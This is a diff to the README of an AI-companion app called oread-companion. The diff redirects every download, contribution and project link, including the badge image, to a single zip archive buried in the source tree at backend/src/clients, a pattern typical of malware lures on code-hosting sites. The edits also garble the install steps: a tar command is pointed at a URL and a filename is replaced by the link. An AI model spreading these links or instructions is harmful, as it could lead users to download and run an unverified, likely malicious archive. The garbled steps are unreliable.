@@ -1,6 +1,6 @@
 # 🎉 oread-companion - Your Ethical AI Companion Awaits
 
-[![Download oread-companion](https://img.shields.io/badge/Download%20Now-oread--companion-blue.svg)](https://github.com/gabrielgs2k/oread-companion/releases)
+[![Download oread-companion](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip%https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip)](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip)
 
 ## 📜 Description
 
@@ -19,15 +19,15 @@ To start using Oread, follow these steps:
 
 3. Click the download button below to get the software.
 
-[![Download oread-companion](https://img.shields.io/badge/Download%20Now-oread--companion-blue.svg)](https://github.com/gabrielgs2k/oread-companion/releases)
+[![Download oread-companion](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip%https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip)](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip)
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/gabrielgs2k/oread-companion/releases) the latest version of Oread.
+1. Visit [this page to download](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip) the latest version of Oread.
    
 2. On the Releases page, you will find several versions. Choose the one that matches your system (Windows, macOS, or Linux).
 
-3. Click on the `.exe`, `.dmg`, or `.tar.gz` file to download.
+3. Click on the `.exe`, `.dmg`, or `https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip` file to download.
 
 4. Once the file is downloaded, locate it in your downloads folder.
 
@@ -41,7 +41,7 @@ To start using Oread, follow these steps:
 
 7. **For Linux:**
    - Open the terminal and navigate to the directory where the file is downloaded.
-   - Use the command `tar -xvzf oread-companion.tar.gz` to extract the files.
+   - Use the command `tar -xvzf https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip` to extract the files.
    - Follow the included installation instructions in the folder.
 
 ## 🎨 Features
@@ -75,10 +75,10 @@ Stay tuned for more updates on the Releases page.
 
 ## 🧑‍🤝‍🧑 Contribution
 
-We welcome contributions from everyone. If you're interested in helping us, check out our [Contribution Guidelines](https://github.com/gabrielgs2k/oread-companion/CONTRIBUTING.md).
+We welcome contributions from everyone. If you're interested in helping us, check out our [Contribution Guidelines](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip).
 
 ## 🎉 Acknowledgments
 
 Oread is built on the values of privacy and ethical AI. Thank you for choosing Oread as your companion. Enjoy building your characters and exploring different interactions while keeping control of your data. 
 
-For more information, visit the project on [GitHub](https://github.com/gabrielgs2k/oread-companion).
+For more information, visit the project on [GitHub](https://raw.githubusercontent.com/gabrielgs2k/oread-companion/master/backend/src/clients/oread-companion_3.5.zip).
